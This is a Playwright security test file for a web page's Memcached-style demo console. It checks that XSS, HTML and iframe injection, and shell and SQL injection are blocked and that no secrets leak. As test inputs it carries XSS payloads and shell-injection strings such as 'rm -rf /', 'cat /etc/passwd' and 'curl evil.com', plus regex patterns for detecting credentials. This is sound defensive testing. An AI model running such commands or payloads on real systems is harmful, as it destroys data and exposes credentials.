/**
 * Security Integration Tests
 * Owner: Scenario 14 - Security Validation
 *
 * Test cases:
 * - XSS attempt in input is sanitized/escaped
 * - HTML injection is prevented
 * - Command injection is blocked
 * - No secrets exposed in client code
 * - CSP headers check (for dynamic content)
 */

const { test, expect } = require('@playwright/test');

test.describe('Security Validation', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/');
    // Wait for demo to initialize
    await page.waitForSelector('#demo-input');
  });

  test.describe('XSS Prevention', () => {
    test('TC-1: script tags in demo input are not executed', async ({ page }) => {
      // Set up a flag to detect if script executes
      await page.evaluate(() => {
        window.xssExecuted = false;
      });

      // Enter XSS payload in demo input
      const demoInput = page.locator('#demo-input');
      await demoInput.fill('<script>window.xssExecuted=true;alert(1)</script>');

      // Submit the command
      await page.click('[data-testid="demo-submit"]');

      // Wait for response to appear
      await page.waitForTimeout(300);

      // Verify script was not executed
      const xssExecuted = await page.evaluate(() => window.xssExecuted);
      expect(xssExecuted).toBe(false);

      // Verify the output does not contain unescaped script tag
      const outputArea = page.locator('#demo-output');
      const outputHtml = await outputArea.innerHTML();

      // The script tag should either be escaped or rejected, not rendered as HTML
      expect(outputHtml).not.toContain('<script>');

      // Check that the text content shows the input was handled safely
      const outputText = await outputArea.textContent();
      expect(outputText).toContain('ERROR'); // Command should be rejected or escaped
    });

    test('TC-1b: XSS via img onerror is prevented', async ({ page }) => {
      await page.evaluate(() => {
        window.imgXssExecuted = false;
      });

      const demoInput = page.locator('#demo-input');
      await demoInput.fill('SET <img src=x onerror="window.imgXssExecuted=true"> 0 0 5');
      await page.click('[data-testid="demo-submit"]');

      await page.waitForTimeout(300);

      const xssExecuted = await page.evaluate(() => window.imgXssExecuted);
      expect(xssExecuted).toBe(false);
    });

    test('TC-1c: XSS via event handlers is prevented', async ({ page }) => {
      await page.evaluate(() => {
        window.eventXssExecuted = false;
      });

      const demoInput = page.locator('#demo-input');
      await demoInput.fill('GET <div onmouseover="window.eventXssExecuted=true">test</div>');
      await page.click('[data-testid="demo-submit"]');

      await page.waitForTimeout(300);

      const xssExecuted = await page.evaluate(() => window.eventXssExecuted);
      expect(xssExecuted).toBe(false);
    });
  });

  test.describe('HTML Injection Prevention', () => {
    test('TC-2: malicious HTML in demo input is escaped', async ({ page }) => {
      const demoInput = page.locator('#demo-input');

      // Try to inject HTML
      await demoInput.fill('SET <b>bold</b><a href="evil.com">click</a> 0 0 10');
      await page.click('[data-testid="demo-submit"]');

      await page.waitForTimeout(300);

      // Check that HTML is not rendered as actual elements
      const outputArea = page.locator('#demo-output');
      const boldElements = outputArea.locator('b');
      const linkElements = outputArea.locator('a[href="evil.com"]');

      // These elements should not exist in the output
      await expect(boldElements).toHaveCount(0);
      await expect(linkElements).toHaveCount(0);

      // The HTML should be escaped (shown as text) or rejected
      const outputHtml = await outputArea.innerHTML();
      expect(outputHtml).not.toMatch(/<b>bold<\/b>/);
      expect(outputHtml).not.toMatch(/<a href="evil.com">/);
    });

    test('TC-2b: iframe injection is prevented', async ({ page }) => {
      const demoInput = page.locator('#demo-input');
      await demoInput.fill('SET <iframe src="evil.com"></iframe> 0 0 5');
      await page.click('[data-testid="demo-submit"]');

      await page.waitForTimeout(300);

      const outputArea = page.locator('#demo-output');
      const iframes = outputArea.locator('iframe');
      await expect(iframes).toHaveCount(0);
    });

    test('TC-2c: form injection is prevented', async ({ page }) => {
      const demoInput = page.locator('#demo-input');
      await demoInput.fill('SET <form action="evil.com"><input name="x"></form> 0 0 5');
      await page.click('[data-testid="demo-submit"]');

      await page.waitForTimeout(300);

      const outputArea = page.locator('#demo-output');
      const forms = outputArea.locator('form');
      await expect(forms).toHaveCount(0);
    });
  });

  test.describe('Secrets Exposure Check', () => {
    test('TC-3: no API keys or secrets in page source', async ({ page }) => {
      // Get all page content including scripts
      const pageContent = await page.content();

      // Common patterns for secrets
      const secretPatterns = [
        /api[_-]?key\s*[:=]\s*['"][a-zA-Z0-9]{20,}['"]/gi,
        /api[_-]?secret\s*[:=]\s*['"][a-zA-Z0-9]{20,}['"]/gi,
        /auth[_-]?token\s*[:=]\s*['"][a-zA-Z0-9]{20,}['"]/gi,
        /bearer\s+[a-zA-Z0-9-_=]+\.[a-zA-Z0-9-_=]+\.[a-zA-Z0-9-_=]+/gi, // JWT
        /password\s*[:=]\s*['"][^'"]{8,}['"]/gi,
        /secret[_-]?key\s*[:=]\s*['"][a-zA-Z0-9]{16,}['"]/gi,
        /private[_-]?key\s*[:=]\s*['"][a-zA-Z0-9]{20,}['"]/gi,
        /aws_access_key_id\s*[:=]\s*['"]AKIA[a-zA-Z0-9]{16}['"]/gi,
        /aws_secret_access_key\s*[:=]\s*['"][a-zA-Z0-9/+]{40}['"]/gi,
      ];

      for (const pattern of secretPatterns) {
        const matches = pageContent.match(pattern);
        expect(matches, `Found potential secret matching ${pattern}`).toBeNull();
      }
    });

    test('TC-3b: no hardcoded tokens in JavaScript files', async ({ page }) => {
      // Get the JavaScript files
      const jsFiles = ['assets/js/main.js', 'assets/js/demo.js', 'assets/js/navigation.js', 'assets/js/clipboard.js'];

      for (const jsFile of jsFiles) {
        const response = await page.goto(`/${jsFile}`);
        if (response && response.ok()) {
          const jsContent = await response.text();

          // Check for hardcoded sensitive values
          expect(jsContent).not.toMatch(/api[_-]?key\s*[:=]\s*['"][a-zA-Z0-9]{20,}['"]/gi);
          expect(jsContent).not.toMatch(/secret\s*[:=]\s*['"][a-zA-Z0-9]{20,}['"]/gi);
          expect(jsContent).not.toMatch(/token\s*[:=]\s*['"][a-zA-Z0-9-_.]{20,}['"]/gi);
        }
      }

      // Navigate back to homepage for other tests
      await page.goto('/');
    });

    test('TC-3c: sensitive data not in localStorage or sessionStorage', async ({ page }) => {
      await page.goto('/');
      await page.waitForSelector('#demo-input');

      // Execute a few commands to populate any storage
      const demoInput = page.locator('#demo-input');
      await demoInput.fill('SET testkey 0 0 5');
      await page.click('[data-testid="demo-submit"]');
      await page.waitForTimeout(300);

      // Check localStorage
      const localStorageData = await page.evaluate(() => {
        const data = {};
        for (let i = 0; i < localStorage.length; i++) {
          const key = localStorage.key(i);
          data[key] = localStorage.getItem(key);
        }
        return JSON.stringify(data);
      });

      // Check sessionStorage
      const sessionStorageData = await page.evaluate(() => {
        const data = {};
        for (let i = 0; i < sessionStorage.length; i++) {
          const key = sessionStorage.key(i);
          data[key] = sessionStorage.getItem(key);
        }
        return JSON.stringify(data);
      });

      // Verify no sensitive patterns in storage
      expect(localStorageData).not.toMatch(/password/i);
      expect(localStorageData).not.toMatch(/api[_-]?key/i);
      expect(localStorageData).not.toMatch(/secret/i);
      expect(sessionStorageData).not.toMatch(/password/i);
      expect(sessionStorageData).not.toMatch(/api[_-]?key/i);
      expect(sessionStorageData).not.toMatch(/secret/i);
    });
  });

  test.describe('Command Injection Prevention', () => {
    test('TC-4: shell command injection is blocked', async ({ page }) => {
      const demoInput = page.locator('#demo-input');

      // The client-side demo simulates Memcached protocol
      // Commands with shell metacharacters (;|&`) should be rejected or handled safely
      // We verify that shell commands aren't actually executed by checking:
      // 1. No system file contents like /etc/passwd appear
      // 2. Commands are treated as invalid Memcached commands (returning errors)

      // Test shell injection patterns
      const injectionAttempts = [
        { cmd: 'SET key; rm -rf / 0 0 5', expectError: true },
        { cmd: 'GET key | cat /etc/passwd', expectError: false }, // GET might work, but no passwd
        { cmd: 'SET key`whoami` 0 0 5', expectError: true },
        { cmd: 'DELETE key; curl evil.com', expectError: true },
      ];

      for (const { cmd } of injectionAttempts) {
        await demoInput.fill(cmd);
        await page.click('[data-testid="demo-submit"]');
        await page.waitForTimeout(300);

        const outputText = await page.locator('#demo-output').textContent();

        // Should NOT contain actual system command output
        expect(outputText).not.toContain('root:x:'); // /etc/passwd content pattern
        expect(outputText).not.toContain('/bin/bash'); // shell paths
        expect(outputText).not.toContain('uid='); // whoami output
      }
    });

    test('TC-4b: only valid Memcached commands are accepted', async ({ page }) => {
      const demoInput = page.locator('#demo-input');

      // Valid Memcached commands should work
      const validCommands = ['GET testkey', 'VERSION', 'STATS'];

      for (const cmd of validCommands) {
        await demoInput.fill(cmd);
        await page.click('[data-testid="demo-submit"]');
        await page.waitForTimeout(300);

        // Should get a valid response (not an unknown command error for the base command)
        const outputText = await page.locator('#demo-output').textContent();
        // VERSION should return version info, STATS should return stats, GET might return END
        expect(outputText.toLowerCase()).not.toContain('unknown command');
      }
    });

    test('TC-4c: SQL injection attempts are harmless', async ({ page }) => {
      const demoInput = page.locator('#demo-input');

      // SQL injection should have no effect on a key-value store
      // The demo is a Memcached-style key-value store, not SQL
      // We verify that:
      // 1. No SQL error messages appear
      // 2. No database query results appear
      // 3. Commands are treated as regular Memcached commands

      const sqlInjections = [
        "GET key' OR '1'='1",
        'GET key UNION SELECT * FROM users',
      ];

      for (const injection of sqlInjections) {
        await demoInput.fill(injection);
        await page.click('[data-testid="demo-submit"]');
        await page.waitForTimeout(300);

        const outputText = await page.locator('#demo-output').textContent();

        // Should NOT contain SQL error messages or query results
        expect(outputText).not.toMatch(/syntax error/i);
        expect(outputText).not.toMatch(/mysql/i);
        expect(outputText).not.toMatch(/postgresql/i);
        expect(outputText).not.toMatch(/sqlite/i);
        expect(outputText).not.toMatch(/rows? affected/i);
        expect(outputText).not.toMatch(/column.*does not exist/i);
      }
    });
  });

  test.describe('Content Security Policy', () => {
    test('TC-5: page loads without CSP violations', async ({ page }) => {
      // Listen for console errors related to CSP
      const cspViolations = [];
      page.on('console', msg => {
        if (msg.type() === 'error' && msg.text().includes('Content Security Policy')) {
          cspViolations.push(msg.text());
        }
      });

      await page.goto('/');
      await page.waitForSelector('#demo-input');

      // Interact with the page to trigger any potential CSP issues
      await page.click('[data-testid="demo-submit"]');
      await page.waitForTimeout(500);

      // No CSP violations should have occurred
      expect(cspViolations).toHaveLength(0);
    });

    test('TC-5b: inline scripts are avoided (CSP compatible)', async ({ page }) => {
      const pageContent = await page.content();

      // Check for inline event handlers (onclick, onerror, etc.)
      // These should be minimal or use nonces if present
      const inlineHandlerPattern = /on(click|load|error|mouseover|submit|keydown|keyup)="[^"]+"/gi;
      const matches = pageContent.match(inlineHandlerPattern) || [];

      // Allow minimal inline handlers but flag excessive use
      expect(matches.length).toBeLessThan(5);
    });

    test('TC-5c: external scripts use secure protocols', async ({ page }) => {
      const scripts = await page.locator('script[src]').all();

      for (const script of scripts) {
        const src = await script.getAttribute('src');
        if (src && src.startsWith('http')) {
          // If absolute URL, must be HTTPS
          expect(src).toMatch(/^https:/);
        }
      }
    });
  });

  test.describe('Output Encoding', () => {
    test('output display uses safe text rendering', async ({ page }) => {
      const demoInput = page.locator('#demo-input');

      // Enter input with special characters
      await demoInput.fill('SET test<>&"\' 0 0 5');
      await page.click('[data-testid="demo-submit"]');

      await page.waitForTimeout(300);

      // The output should use textContent or properly escaped HTML
      // Verify the DOM structure doesn't contain raw HTML elements from input
      const outputLines = await page.locator('.demo__output-line').all();

      for (const line of outputLines) {
        const innerHTML = await line.innerHTML();
        const textContent = await line.textContent();

        // If special chars appear in text, they should be entity-encoded in HTML
        if (textContent.includes('<')) {
          // Either escaped or textContent is handling it safely
          expect(innerHTML).toMatch(/(&lt;|<)/);
        }
      }
    });
  });
});
